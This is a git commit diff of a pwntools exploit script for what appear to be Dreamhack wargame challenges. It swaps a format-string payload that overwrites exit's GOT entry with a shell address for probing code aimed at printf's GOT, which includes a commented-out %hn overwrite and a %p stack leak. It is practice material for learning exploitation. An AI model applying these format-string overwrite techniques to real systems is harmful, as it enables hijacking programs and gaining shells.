17b67d5888a329ad25e36c0442b8c0b8e79da6e9
Brian Lee <hibrian827@gmail.com>
2024-08-11 22:25:46 +0900

    solving

--- Dreamhack/main.py
+++ Dreamhack/main.py
@@ -2,15 +2,15 @@ from pwn import *
 
 port = 0
 # rem = remote("", port)
-rem = process("./basic_exploitation_002/problem/basic_exploitation_002")
+rem = process("./basic_exploitation_003/problem/basic_exploitation_003")
 
-exit_plt = 0x8048470
-shell_addr = 0x8048609
-payload = f'%{int.from_bytes(p32(shell_addr), "big")}c%3$n'.ljust(16)
-payload = payload.encode()
-payload += p32(exit_plt)
+# shell : 0x8048669
+# pause()
+printf_got = 0x804a010
+# payload = "%2052c%5$hn%38924c%6$hn".ljust(16).encode() + p32(printf_got + 2) + p32(printf_got)
+payload = b'A' * 16 + p32(printf_got + 2)  + p32(printf_got) * 16+ b'.%1$p.%2$p.%3$p.%4$p.%5$p.%6$p'
 
 rem.sendline(payload)
-rem.recvall()
 
-rem.interactive()
+print(rem.recvline())
+# rem.interactive()
